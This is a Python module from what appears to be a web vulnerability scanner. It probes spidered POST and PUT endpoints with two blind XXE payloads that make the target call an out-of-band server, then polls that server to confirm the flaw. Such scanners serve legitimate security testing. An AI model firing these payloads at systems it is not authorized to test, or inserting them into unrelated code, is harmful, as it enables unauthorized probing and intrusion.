import asyncio
import aiohttp
import time
from hellhound.core import oob_utils

NAME = "xxe_detector"
CATEGORY = "vuln"
DESCRIPTION = "Blind XML External Entity (XXE) Auditor"

OPTIONS = [
    {"name": "timeout", "type": int, "default": 10, "help": "Request timeout (seconds)"},
]

XXE_PAYLOADS = [
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "{oob_url}" >]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "{oob_url}"><%remote;]>',
]

class XXEAuditor:
    def __init__(self, emit, session, options):
        self.emit = emit
        self.session = session
        self.options = options
        self.oob_url = oob_utils.resolve_oob_url(options)

    async def check_xxe(self, url, method, data):
        """Checks for XXE using OOB triggers."""
        if not self.oob_url:
            return []

        findings = []
        token = f"xxe-{int(time.time())}"
        oob_target = f"{self.oob_url}/{token}"

        for payload_tmpl in XXE_PAYLOADS:
            payload = payload_tmpl.format(oob_url=oob_target)
            try:
                headers = {"Content-Type": "application/xml"}
                async with self.session.request(method, url, data=payload, headers=headers, timeout=self.options.get("timeout")) as r:
                    await r.read()
                
                # Poll OOB server
                oob_server = self.options.get("oob_server")
                if oob_server:
                    hit, data_res = oob_server.poll(token, timeout=5)
                    if hit:
                        findings.append({
                            "url": url,
                            "type": "XXE",
                            "severity": "HIGH",
                            "evidence": f"Confirmed XXE callback from target via {method}! Hits: {data_res}"
                        })
                        break
            except:
                continue
        return findings

async def run(target, emit, options=None):
    emit.info(f"[*] XXE_DETECTOR: Probing for XML External Entity on {target}")
    
    oob_url = oob_utils.resolve_oob_url(options)
    if not oob_url:
        emit.warn("[!] No OOB server active. Blind XXE detection is disabled.")
        return {"raw": "No OOB", "signals": []}

    spider_intel = options.get("spider_intel", {}) if options else {}
    endpoints = spider_intel.get("endpoints", [])
    
    # Target endpoints that likely accept XML or POST data
    targets = [e for e in endpoints if e.get("method", "GET").upper() in ["POST", "PUT"]]
    
    if not targets:
        emit.warn("[!] No POST/PUT endpoints identified for XXE testing.")
        return {"raw": "No targets", "signals": []}

    emit.info(f"    [i] Auditing {len(targets)} potential XXE surface(s)...")

    findings = []
    async with aiohttp.ClientSession() as session:
        auditor = XXEAuditor(emit, session, options or {})
        for t in targets:
            res = await auditor.check_xxe(t["url"], t["method"], "")
            if res:
                findings.extend(res)
                for f in res:
                    emit.warn(f"        [!] XXE FOUND: {f['url']} via {t['method']}")

    if findings:
        emit.success(f"[+] XXE_DETECTOR complete. Found {len(findings)} XXE vulnerabilities!")
    else:
        emit.info("[-] No XXE vulnerabilities detected.")

    return {
        "raw": f"Audited {len(targets)} surfaces. Found {len(findings)} XXE.",
        "intel": {
            "vulnerabilities": findings
        },
        "signals": ["XXE_FOUND" if findings else "NO_XXE"]
    }
